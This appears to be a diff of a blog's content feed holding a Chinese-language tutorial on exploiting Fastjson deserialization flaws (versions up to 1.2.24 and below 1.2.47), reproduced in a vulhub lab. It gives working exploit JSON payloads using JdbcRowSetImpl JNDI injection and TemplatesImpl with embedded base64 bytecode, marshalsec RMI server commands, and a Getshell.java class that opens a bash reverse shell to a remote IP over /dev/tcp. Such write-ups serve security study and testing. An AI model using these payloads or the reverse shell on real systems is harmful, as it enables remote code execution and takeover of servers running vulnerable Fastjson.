+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;<span class="comment">//白名单判断</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;<span class="comment">//黑名单判断</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<span class="comment">//从缓存表中查找类名</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;<span class="comment">//在这里就直接返回了clazz</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>查看<code>getClassFromMapping</code>方法,在<code>com.alibaba.fastjson.util.TypeUtils</code>类中</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);<span class="comment">//可以发现获取的是mappings参数的类名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>找一下mappings参数的<code>put方法</code>,发现有两处,第一处是<code>addBaseClassMappings方法</code></p>
+<p><img src="image-20230411180046143.png" alt="image-20230411180046143"></p>
+<p>听名字都知道这里只是将一些基础类放到mappings中,我们无法控制</p>
+<p>另外一处是<code>loadClass方法</code>,loadClass会把传入的类名放到mappings中</p>
+<p><img src="image-20230411180157779.png" alt="image-20230411180157779"></p>
+<p>找一下发现<code>com.alibaba.fastjson.serializer.MiscCodec</code>类调用了loadClass方法</p>
+<p><img src="image-20230411180847428.png" alt="image-20230411180847428"></p>
+<p>而MiscCodec又实现了<code>ObjectSerializer</code>接口,说明它是一个``反序列化器`,</p>
+<p><img src="image-20230411180951750.png" alt="image-20230411180951750"></p>
+<p>然而fastjson的反序列化需要用到反序列化器,这个反序列化器是从config中得到的</p>
+<p><img src="image-20230411181146140.png" alt="image-20230411181146140"></p>
+<p>根据反序列化类的不同调用不同的的反序列化器,如下图中如果反序列化的类是<code>Class类</code>,那么就会调用MiscCodec类这个反序列化器,进而调用loadClass方法</p>
+<p><img src="image-20230411181352396.png" alt="image-20230411181352396"></p>
+<p>再来看看参数的传递,我们要让<code>com.sun.rowset.JdbcRowSetImpl</code>作为参数传入到loadClass方法,在MiscCodec类中传入的是strVal参数,而与strVal参数有关的部分代码为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object objVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;<span class="comment">//检查当前解析的 JSON 对象是否为类型名重定向（TypeNameRedirect）</span></span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<span class="comment">//检查下一个标记是否为字符串</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;<span class="comment">//校验其值是否为 &quot;val&quot;</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.COLON);<span class="comment">//读取下一个 JSON 标记,以跳过冒号（:）分隔符</span></span><br><span class="line"></span><br><span class="line">    objVal = parser.parse();<span class="comment">//使用 parse() 方法解析 JSON 对象的值部分</span></span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String strVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">    strVal = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;<span class="comment">//这里将objVal的值给了strVal</span></span><br></pre></td></tr></table></figure>
+<p>为了使最后的strVal等于com.sun.rowset.JdbcRowSetImpl,我们要传入一个<code>val</code>,其值为<code>com.sun.rowset.JdbcRowSetImpl</code></p>
+<p>最后构造poc</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:8085/PxTxVXhC&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>命令执行成功</p>
+<p><img src="image-20230411192547329.png" alt="image-20230411192547329"></p>
+<h1 id="vulhub复现">vulhub复现</h1>
+<p>启动靶场（这里打的是1.2.47）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>yakit开个监听端口</p>
+<p><img src="image-20230501212304453.png" alt="image-20230501212304453"></p>
+<p>编写恶意代码Getshell.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Getshell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i&gt;&amp; /dev/tcp/192.168.210.10/2333 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译以后利用python将Getshell.class挂起来</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server 6666</span><br></pre></td></tr></table></figure>
+<p>接下来利用<code>marshalsec</code>启动RMI服务（这里直接用yakit似乎没用）</p>
+<p>项目地址：  <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+<p>下载以后先用mvn编译</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mvn clean package -DskipTests </span><br></pre></td></tr></table></figure>
+<p>生成target后运行marshalsec-0.0.3-SNAPSHOT-all.jar</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.59.1:6666/#Getshell&quot; 9999</span><br></pre></td></tr></table></figure>
+<p>构造exp</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://192.168.59.1:9999/Getshell&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>burpsuite重放以后发现yakit成功反弹了shell</p>
+<p><img src="image-20230501212216120.png" alt="image-20230501212216120"></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java反序列化之cc2和cc4</title>
     <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2%E5%92%8Ccc4/</url>
     <content><![CDATA[<h1 id="CC4">CC4</h1>
@@ -557,108 +659,6 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
-    <title>java反序列化之fastjson</title>
-    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/</url>
-    <content><![CDATA[<h1 id="FastJson-1-2-22-1-2-24">FastJson 1.2.22 - 1.2.24</h1>
-<p><code>fastjson</code>是java反序列化中一个经典的漏洞了,早些在使用java写爬虫程序的时候就用过这个库,今天就针对其反序列化漏洞再来学习一次。</p>
-<p>首先先介绍一下JavaBean ，<code>JavaBean</code> 包括一个默认的<code>构造函数</code>、<code>私有的成员变量</code>以及<code>公共的 getter 和 setter 方法</code>。这些方法用于对类中的属性进行读取和赋值操作,并且可以通过反射机制对其进行访问。</p>
-<p>JavaBean 类通常被用作数据传输对象（DTO）或持久化对象（POJO）,并且经常与 Web 应用程序框架（如 Spring MVC）一起使用。通过将数据映射到 JavaBean 对象中,我们可以方便地进行数据绑定、表单验证以及数据库访问等操作。</p>
-<p>以下是一个简单的 JavaBean 类示例：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge被调用了&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName被调用了&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge被调用了&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName被调用了&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>示例代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">21</span>,<span class="string">&quot;1y0ng&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(stringobject);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> JSON.parseObject(stringobject,Person.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>输出结果：</p>
-<p><img src="image-20230410210446299.png" alt="image-20230410210446299"></p>
-<p>可见在fastjson在序列化的时候会调用JavaBean对象中对应参数的<code>get方法</code>,而在反序列化的时候会调用相应的<code>set方法</code>（要指定反序列化对象）,但我们如何选择反序列化后生成对象是谁呢？</p>
-<p>fastjson给了我们一个<code>@type</code>用来指定反序列化后生成的对象：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;:\&quot;age\&quot;:21,\&quot;name\&quot;:\&quot;1y0ng\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parseObject(stringobject));</span><br></pre></td></tr></table></figure>
-<p><img src="image-20230410215040668.png" alt="image-20230410215040668"></p>
-<blockquote>
-<p>注:这里如果只是以下函数是不会触发get和set方法的</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:21,\&quot;name\&quot;:\&quot;1y0ng\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parseObject(stringobject));</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2 id="结合cc3">结合cc3</h2>
-<p>之前在学cc3和shiro的CB链的时候用到了<code>TemplatesImpl类</code>的<code>getOutputProperties方法</code>,刚好这就是get方法,所以我们这里这里可以试试这种方法的利用</p>
-<p>首先将字节数组以<code>base64字符串</code>的形式输出</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(codes));</span><br></pre></td></tr></table></figure>
-<p>然后放入到json字符串中得到poc：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMcnVudGltZTsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAxydW50aW1lLmphdmEMAAkACgcALgwALwAwAQAEY2FsYwwAMQAyAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAMwAKAQAHcnVudGltZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFQANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAMAAkADwAMAA0ADQAOABEAEAANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxx&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>测试：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66v……;</span></span><br><span class="line"><span class="string">JSON.parseObject(stringobject,Feature.SupportNonPublicField);</span></span><br></pre></td></tr></table></figure>
-<p><img src="image-20230410223538055.png" alt="image-20230410223538055"></p>
-<p>其中,<code>Feature.SupportNonPublicField</code> 是 Fastjson 库中的一个选项,用于控制是否支持序列化和反序列化非公共字段。如果将该选项设置为 <code>true</code>,则 Fastjson 将尝试序列化和反序列化所有字段,包括私有字段和受保护字段。由于这里TemplatesImpl类的属性全都是private,所以需要设置第二个参数为<code>Feature.SupportNonPublicField</code></p>
-<p>​</p>
-<h2 id="基于JdbcRowSetImpl的jndi注入">基于JdbcRowSetImpl的jndi注入</h2>
-<p>要想利用cc3有很多的局限性,所以我们还可以通过jndi注入执行命令</p>
-<p><code>com.sun.rowset.JdbcRowSetImpl</code>这个类为我们提供了条件,其中的<code>connect()</code>方法为：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get a JDBC connection.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// First check for Connection handle object as such if</span></span><br><span class="line">    <span class="comment">// &quot;this&quot; initialized  using conn.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Connect using JNDI.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource)ctx.lookup<span class="comment">//这里可以尝试jndi注入</span></span><br><span class="line">                (getDataSourceName());</span><br><span class="line">            <span class="comment">//return ds.getConnection(getUsername(),getPassword());</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(getUsername() != <span class="literal">null</span> &amp;&amp; !getUsername().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                 <span class="keyword">return</span> ds.getConnection(getUsername(),getPassword());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (javax.naming.NamingException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getUrl() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Check only for getUrl() != null because</span></span><br><span class="line">        <span class="comment">// user, passwd can be null</span></span><br><span class="line">        <span class="comment">// Connect using the driver manager.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection</span><br><span class="line">                (getUrl(), getUsername(), getPassword());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>接下来发现connect()方法被<code>setAutoCommit方法</code>调用了</p>
-<p><img src="image-20230411161822971.png" alt="image-20230411161822971"></p>
-<p><img src="image-20230411195545182.png" alt="image-20230411195545182"></p>
-<p>这里刚好是一个set方法,可以被fastjson反序列化调用</p>
-<p>这里推荐一个工具——<a href="https://www.yaklang.io">yakit</a></p>
-<p>开启反连服务器</p>
-<p><img src="image-20230411163548141.png" alt="image-20230411163548141"></p>
-<p>设置JavaPayLoad</p>
-<p><img src="image-20230411163755158.png" alt="image-20230411163755158"></p>
-<p>构造poc（网上有人说这里autoCommit必须为true,但我测试下来true和false都可以）</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8085/hDEqCUyW&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>
-<p>命令执行成功<img src="image-20230411163909090.png" alt="image-20230411163909090"></p>
-<h1 id="FastJson-1-2-47">FastJson &lt;1.2.47</h1>
-<p>在1.2.24版本之后,fastjson引入了一个<code>checkAutotype函数</code>,通过黑白名单的方式来检查反序列化是否安全,如果能正常返回clazz的话就会加载并实例化clazz类</p>
-<p><img src="image-20230411174550334.png" alt="image-20230411174550334"></p>
-<p>判断的流程有些复杂,但还是存在可以绕过的情况。在checkAutotype函数中首先会进行一个黑白名单判断,如果传入的类既不在白名单里又不在黑名单里,那么就会对缓存中存在的类进行判断,如果能够在缓存中找到这个类,就返回这个类的clazz,主要代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;<span class="comment">//白名单判断</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> 